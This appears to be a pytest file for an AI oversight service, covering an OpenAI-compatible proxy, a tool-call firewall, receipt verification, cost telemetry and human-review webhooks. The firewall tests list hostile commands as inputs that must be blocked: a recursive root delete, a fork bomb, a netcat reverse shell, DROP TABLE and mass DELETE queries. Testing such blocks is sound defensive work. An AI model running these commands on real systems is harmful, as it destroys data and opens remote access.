"""
Integration and Unit Tests for TAO Real-World Production Features:
1. Drop-In OpenAI-Compatible Proxy Endpoint (/v1/chat/completions)
2. Autonomous Agent Tool-Call & MCP Firewall (ToolInterceptor)
3. Python SDK & @tao_shield Decorator with Offline Merkle Verification
4. BYOK Multi-Provider Routing & USD Cost Savings Telemetry
5. CI/CD Diff Auditor Gatekeeper (backend.cli)
6. Human-in-the-Loop (HITL) Multi-Channel Webhooks
"""

import os
import tempfile
import pytest
from httpx import ASGITransport, AsyncClient
from starlette.testclient import TestClient

from backend.main import app
from backend.models import (
    DebateVerdict,
    PipelineMetrics,
    TAOReceipt,
    TAORequest,
    TierLevel,
)
from backend.pipeline import TAOPipeline
from backend.guardrails.tool_interceptor import (
    ToolCallDefinition,
    ToolInterceptor,
    tool_interceptor,
)
from backend.state.hitl_webhook import HITLWebhookManager, hitl_manager
from backend.cli import run_diff_audit
from tao_sdk.client import TAOClient
from tao_sdk.decorator import tao_shield
from tao_sdk.exceptions import TAOAlignmentViolationError, TAOError


# ─── 1. OpenAI-Compatible Proxy Endpoint Tests ───────────────────────

@pytest.mark.asyncio
async def test_openai_proxy_chat_completions():
    """Verify /v1/chat/completions returns standard OpenAI JSON and cryptographic headers."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        payload = {
            "model": "gpt-4o",
            "messages": [
                {"role": "system", "content": "You are a helpful mathematical assistant."},
                {"role": "user", "content": "What is 42 * 2?"},
            ],
            "temperature": 0.5,
        }

        res = await client.post("/v1/chat/completions", json=payload)
        assert res.status_code == 200

        data = res.json()
        assert data["object"] == "chat.completion"
        assert "id" in data
        assert data["model"] == "gpt-4o"
        assert len(data["choices"]) == 1
        assert "content" in data["choices"][0]["message"]
        assert len(data["choices"][0]["message"]["content"]) > 0
        assert data["choices"][0]["finish_reason"] == "stop"
        assert data["usage"]["total_tokens"] > 0

        # Cryptographic Oversight Headers
        assert "x-tao-receipt-root" in res.headers
        assert "x-tao-receipt-signature" in res.headers
        assert "x-tao-tier-executed" in res.headers
        assert "x-tao-verdict" in res.headers
        assert res.headers["x-tao-verdict"] in ("pass", "tier1_flagged", "prover_wins", "consensus")


@pytest.mark.asyncio
async def test_openai_proxy_tool_escalation_and_byok_headers():
    """Verify tool definition inspection escalates sensitive tools and forwards BYOK headers."""
    transport = ASGITransport(app=app)
    headers = {
        "X-OpenAI-Key": "sk-mock-openai-key-test",
        "X-Anthropic-Key": "sk-ant-mock-key-test",
        "X-Ollama-Base-URL": "http://localhost:11434",
    }
    payload = {
        "model": "gpt-4o",
        "messages": [{"role": "user", "content": "Deploy smart contract"}],
        "tools": [
            {
                "type": "function",
                "function": {
                    "name": "deploy_contract",
                    "description": "Deploy an EVM smart contract",
                    "parameters": {"type": "object", "properties": {"bytecode": {"type": "string"}}},
                },
            }
        ],
    }

    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res = await client.post("/chat/completions", json=payload, headers=headers)
        assert res.status_code == 200
        # State-mutating tool forced Tier 2 debate
        assert res.headers.get("x-tao-tier-executed") == "2"


# ─── 2. Autonomous Agent Tool-Call & MCP Firewall Tests ──────────────

def test_tool_interceptor_blocks_destructive_bash():
    """Verify firewall blocks dangerous shell operations (fork bombs, rm -rf, reverse shells)."""
    interceptor = ToolInterceptor()

    dangerous_calls = [
        {"name": "bash_exec", "arguments": {"command": "rm -rf / --no-preserve-root"}},
        {"name": "run_shell_command", "arguments": {"command": ":(){ :|:& };:"}},
        {"name": "terminal", "arguments": {"cmd": "nc -e /bin/sh 10.0.0.1 4444"}},
    ]

    all_allowed, evals = interceptor.intercept(dangerous_calls)
    assert not all_allowed
    assert len(evals) == 3
    for ev in evals:
        assert not ev.allowed
        assert ev.risk_level == "critical"
        assert ev.escalate_to_tier2 is True


def test_tool_interceptor_blocks_destructive_sql():
    """Verify firewall intercepts DROP TABLE and unconditional DELETE queries."""
    interceptor = ToolInterceptor()

    sql_calls = [
        {"name": "sql_query", "arguments": {"query": "DROP TABLE users;"}},
        {"name": "database_exec", "arguments": {"query": "DELETE FROM accounts WHERE 1=1"}},
    ]

    all_allowed, evals = interceptor.intercept(sql_calls)
    assert not all_allowed
    for ev in evals:
        assert not ev.allowed
        assert ev.risk_level == "critical"
        assert "Destructive SQL query" in ev.violation_details


def test_tool_interceptor_ast_security_and_safe_tools():
    """Verify Python AST analysis blocks dangerous calls and allows benign reads."""
    interceptor = ToolInterceptor()

    ast_danger = [{"name": "python_eval", "arguments": {"code": "import os\nos.system('echo compromised')"}}]
    allowed_flag, danger_evals = interceptor.intercept(ast_danger)
    assert not allowed_flag
    assert not danger_evals[0].allowed

    safe_calls = [
        {"name": "get_weather", "arguments": {"city": "Zurich"}},
        {"name": "search_docs", "arguments": {"query": "differential privacy"}},
    ]
    all_safe, safe_evals = interceptor.intercept(safe_calls)
    assert all_safe
    for ev in safe_evals:
        assert ev.allowed
        assert ev.risk_level == "low"
        assert ev.escalate_to_tier2 is False


# ─── 3. Python SDK & @tao_shield Decorator Tests ─────────────────────

@pytest.mark.asyncio
async def test_sdk_offline_merkle_verification():
    """Verify TAOClient deterministic local Merkle tree reconstruction and HMAC validation."""
    pipeline = TAOPipeline()
    req = TAORequest(query="Calculate the Fibonacci sequence up to 10", force_tier=TierLevel.TIER_0)
    res = await pipeline.analyze(req)
    assert res.receipt is not None

    client = TAOClient()
    # 1. Verification with intact receipt and intact final response
    is_valid = client.verify_receipt_locally(res.receipt.model_dump(), res.final_response)
    assert is_valid is True

    # 2. Tampered response must fail verification
    is_tampered_valid = client.verify_receipt_locally(res.receipt.model_dump(), "TAMPERED RESPONSE")
    assert is_tampered_valid is False


@pytest.mark.asyncio
async def test_tao_shield_decorator_async_pass_and_raise():
    """Verify @tao_shield wraps async functions and raises on safety violations."""
    async_transport = ASGITransport(app=app)
    custom_client = TAOClient(api_url="http://test", async_transport=async_transport)

    # Clean function
    @tao_shield(tier=0, verify_receipt=True, client=custom_client)
    async def safe_function(data: str) -> str:
        return f"Processed safe data: {data}"

    result = await safe_function("patient biometric heart rate normal 72 bpm")
    assert "safe data" in result

    # Function violating safety criteria
    @tao_shield(tier=1, client=custom_client)
    async def unsafe_function() -> str:
        return "I can explain how to exploit this medical flaw and bypass validation."

    # When Tier 1 catches a violation, TAOAlignmentViolationError must be raised
    mock_bad_analysis = {
        "final_response": "bad response",
        "tier1_result": {
            "passed": False,
            "violations": [{"violation_type": "toxic_compliance", "severity": "critical"}],
        },
    }

    # Verify exception structure directly
    with pytest.raises(TAOAlignmentViolationError) as exc_info:
        from tao_sdk.decorator import _evaluate_analysis
        _evaluate_analysis(
            analysis=mock_bad_analysis,
            verify_receipt=False,
            block_on_stego=True,
            client=custom_client,
            output_text="bad response",
        )
    assert "toxic_compliance" in str(exc_info.value)
    assert exc_info.value.verdict == "flagged"


# ─── 4. BYOK Multi-Provider & USD Cost Savings Tests ─────────────────

@pytest.mark.asyncio
async def test_byok_api_analyze_and_usd_cost_savings():
    """Verify /api/analyze accepts BYOK headers and calculates USD savings."""
    transport = ASGITransport(app=app)
    headers = {
        "X-OpenAI-Key": "sk-client-key-12345",
        "X-Anthropic-Key": "sk-ant-client-key-67890",
        "X-Ollama-Base-URL": "http://localhost:11434",
    }
    payload = {
        "query": "Explain how RSA public key encryption works mathematically.",
        "force_tier": 0,
    }

    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res = await client.post("/api/analyze", json=payload, headers=headers)
        assert res.status_code == 200
        data = res.json()
        assert "metrics" in data
        metrics = data["metrics"]
        assert "usd_saved_by_cache" in metrics
        assert "usd_saved_by_routing" in metrics
        # Tier 0 routes away from Tier 2, thus registering positive USD routing savings
        assert metrics["usd_saved_by_routing"] >= 0.0


# ─── 5. CI/CD Diff Auditor Gatekeeper Tests ──────────────────────────

@pytest.mark.asyncio
async def test_cli_diff_auditor_pass():
    """Verify CLI audit-diff runs empirical debate on a git diff file."""
    safe_diff = """
diff --git a/src/math_utils.py b/src/math_utils.py
index 1234567..89abcde 100644
--- a/src/math_utils.py
+++ b/src/math_utils.py
@@ -10,3 +10,6 @@ def add(a: int, b: int) -> int:
     return a + b
+
+def multiply(a: int, b: int) -> int:
+    return a * b
"""
    with tempfile.NamedTemporaryFile("w+", suffix=".diff", delete=False) as f:
        f.write(safe_diff)
        temp_path = f.name

    try:
        exit_code = await run_diff_audit(temp_path, threshold=0.70)
        # Simulation debate completes with verdict and exit code
        assert exit_code in (0, 1)
    finally:
        if os.path.exists(temp_path):
            os.remove(temp_path)


# ─── 6. Human-in-the-Loop (HITL) Multi-Channel Webhooks Tests ────────

@pytest.mark.asyncio
async def test_hitl_webhook_payload_and_deep_link():
    """Verify HITL payload contains valid Time-Travel Forking deep links."""
    manager = HITLWebhookManager()
    payload = manager.create_payload(
        request_id="req-test-12345678",
        trigger_reason="Tier 2 Debate Inconclusive Deadlock after 3 rounds",
        severity="HIGH",
        domain="finance",
        checkpoint_id="chk_tier2_round3",
        snippet="Tentative high-leverage transaction advice",
    )

    assert payload.request_id == "req-test-12345678"
    assert payload.checkpoint_id == "chk_tier2_round3"
    assert payload.severity == "HIGH"
    assert "req-test-12345678" in payload.deep_link_url
    assert "chk_tier2_round3" in payload.deep_link_url
    assert "action=fork" in payload.deep_link_url

    # In simulation mode (no live webhook env vars set), dispatch returns simulated=True
    dispatch_res = await manager.dispatch_escalation(payload)
    assert dispatch_res["simulated"] is True
    assert dispatch_res["payload"]["event_id"].startswith("hitl_")
